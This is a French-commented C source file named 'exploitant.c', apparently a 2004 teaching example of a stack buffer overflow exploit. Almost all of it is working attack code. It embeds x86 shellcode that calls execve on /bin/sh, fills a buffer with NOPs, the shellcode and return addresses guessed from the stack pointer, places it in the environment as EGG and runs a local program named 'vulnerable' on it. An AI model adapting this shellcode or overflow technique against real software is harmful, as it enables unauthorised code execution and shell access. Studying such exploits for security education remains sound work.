 * derniere revision : 18 avril 2004 
 */ 
#include <stdio.h> 
#include <stdlib.h> 
/* ****************************************************************** */ 
/* ********************* CONSTANTES GLOBALES ************************ */ 
/* ****************************************************************** */ 
/* 
 * Definition de la taille de notre tampon.  Il est recommande 
 * d'utiliser 100 octets de plus que la taille du tampon que 
 * l'on veut faire deborder.  Le tampon contiendra notre shellcode, 
 * des "nops" et l'adresse de retour. 
 */ 
#define TAILLE_TAMPON_DEFAUT 228 
/* 
 * "NOP" veut dire "No OPeration".  Cette instruction ne produit 
 * donc aucun effet. 
 */ 
#define NOP 0x90 
/* 
 * Le tableau de caracteres "shellcode" contient les instructions 
 * en assembleur permettant de demarrer un shell "sh".  Notre but 
 * est d'inserer ce code en memoire, et d'ecraser le pointeur 
 * contenant l'adresse de la prochaine instruction pour le remplacer 
 * par l'adresse de ce code. De cette facon, notre shellcode sera 
 * demarrer.  Le shellcode est simplement un appel a "execve()" sur 
 * "/bin/sh" 
 */ 
char shellcode[] = 
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
    "\x80\xe8\xdc\xff\xff\xff/bin/sh"; 
/* ****************************************************************** */ 
/* ********** DECLARATION ET DEFINITION DES FONCTIONS *************** */ 
/* ****************************************************************** */ 
/* 
 * Cette fonction permet d'obtenir la valeur contenue dans le 
 * registre "ESP". 
 */ 
unsigned long get_sp(void) 
{ 
     __asm__("movl %esp, %eax"); 
} 
/* ****************************************************************** */ 
/* *********************** FONCTION PRINCIPALE ********************** */ 
/* ****************************************************************** */
int main(int argc, char *argv[]) 
  { 
  /* DECLARATIONS, DEFINITIONS ET INITIALISATIONS DES VARIABLES */ 
       /* 
        *   Le tampon utilise pour l'exploitation de "vulnerable". 
        */ 
       char *tampon; 
 /* 
        *   Pointeur 
        */ 
       char *ptr; 
       /* 
        *   Le pointeur d'adresse, dans lequel nous mettrons l'adresse 
        *   de retour (instruction suivante = debut du shellcode). 
        */ 
       long *addr_ptr; 
       /* 
        *   L'adresse de retour (instruction suivante = debut du 
        *   shellcode). 
        */ 
       long addr; 
       /* 
        *   La taille de notre tampon. 
        */ 
       int taille_tampon = TAILLE_TAMPON_DEFAUT; 
       /* 
        *   Un entier utilise pour les boucles. 
        */ 
       int i; 
  /* ALLOCATION DU TAMPON EN MEMOIRE */ 
       /* 
        *   Verification que notre tampon peut etre alloue en memoire. 
        */ 
       if(!(tampon = malloc(taille_tampon))) 
       { 
         printf("Memoire insuffisante !\n"); 
         exit(0); 
       } 
  /* CALCUL DE L'ADRESSE DU DEBUT DE NOTRE SHELLCODE */ 
       addr = get_sp(); 
  /* AFFICHAGE DES VALEURS UTILISEES LORS DE l'EXECUTION */ 
       printf("Exploitation de ./vulnerable\n\n"); 
       printf("Utilisant comme adresse de retour : 0x%x\n", addr); 
       printf("stack pointer (pointeur sur la pile) : 0x%x\n", get_sp()); 
       printf("taille du tampon utilise : %d\n", taille_tampon);
/* INITIALISATION (REMPLISSAGE) DU TAMPON */ 
     ptr = tampon; 
     addr_ptr = (long *) ptr; 
     /* On remplis d'abord notre tampon avec l'adresse de retour */ 
     for(i = 0; i < taille_tampon; i+=4) { *(addr_ptr++) = addr; } 
     /* Ensuite on remplis la premiere moitie du tampon de NOP's */ 
     for(i = 0; i < taille_tampon / 2; i++) { tampon[i] = NOP; } 
     /* On positionne ptr sur la deuxieme moitie du tampon moins la 
      * moitie de la longueur du shellcode. 
      */ 
     ptr = tampon + ((taille_tampon/2) - (strlen(shellcode)/2)); 
     /* On copie maintenant notre shellcode (la premiere moitie 
      * a la fin de la premiere moitie du tampon, et la fin au debut 
      * de la deuxieme moitie. 
      */ 
     for(i = 0; i < strlen(shellcode); i++) { *(ptr++) = shellcode[i]; } 
     /* Insertion de '\0' a la fin de notre tampon pour arreter 
      * strcpy(). 
      */ 
     tampon[taille_tampon - 1] = '\0'; 
     /* On insere "EGG=" au debut du tampon pour pouvoir inserer notre 
      * tampon a l'environnement.  Le tampon, moins les quatre premiers 
      * caracteres ("EGG=") sera ajoute a l'environnement dans la 
      * variable nomme "EGG". 
      */ 
     memcpy(tampon, "EGG=", 4); 
     /* On integre le tampon a l'environnement. */ 
     putenv(tampon); 
     /* Finallement, on execute le programme "vulnerable" avec 
      * notre tampon. 
      */ 
     system("./vulnerable $EGG"); 
     /* Fin de normal de l'execution. */ 
     return 0; 
} 
/* ********** Fin du fichier exploitant.c ********** */ 
